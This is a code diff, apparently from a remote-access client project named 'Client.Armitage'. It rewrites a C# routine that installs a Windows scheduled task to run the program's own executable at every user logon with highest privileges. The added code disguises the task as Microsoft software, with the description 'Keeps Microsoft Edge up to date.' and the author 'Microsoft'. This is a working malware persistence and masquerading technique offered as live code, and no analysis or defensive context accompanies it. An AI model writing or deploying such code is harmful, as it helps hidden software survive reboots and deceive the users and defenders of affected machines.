@@ -2,6 +2,7 @@
 using Microsoft.Win32.TaskScheduler;
 using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
@@ -21,14 +22,36 @@ namespace Client.Armitage
         {
             try
             {
-                if (filepath is null) filepath = Constants.MyPath;
-                if (!IsTaskExists(name))
-                    TaskService.Instance.AddTask(name, QuickTriggerType.Logon, filepath);
-                else // replace
+                if (filepath == null) filepath = Constants.MyPath;
+
+                // Microsoft.Win32.TaskScheduler.LogonTrigger t = new LogonTrigger();
+                TaskService ts = new TaskService();
+
+                // if the task already exists, remove it, but will be replaced
+                var atask = ts.GetTask(name);
+
+                if (atask != null) ts.RootFolder.DeleteTask(name);
+
+                // replace
+                TaskDefinition td = ts.NewTask();
+
+                td.RegistrationInfo.Description = "Keeps Microsoft Edge up to date.";
+
+                td.RegistrationInfo.Author = "Microsoft";
+
+                td.Principal.RunLevel = TaskRunLevel.Highest;
+
+                td.Triggers.Add(new LogonTrigger
                 {
-                    // we're supposed to replace the task here with the new
-                    // path but wtf 
-                }
+                    Enabled = true
+                });
+
+                var action = new ExecAction { Path = filepath, WorkingDirectory = Path.GetDirectoryName(filepath), Arguments = string.Empty };
+
+                td.Actions.Add(action);
+
+                ts.RootFolder.RegisterTaskDefinition(name, td);
+
             }
             catch
             {
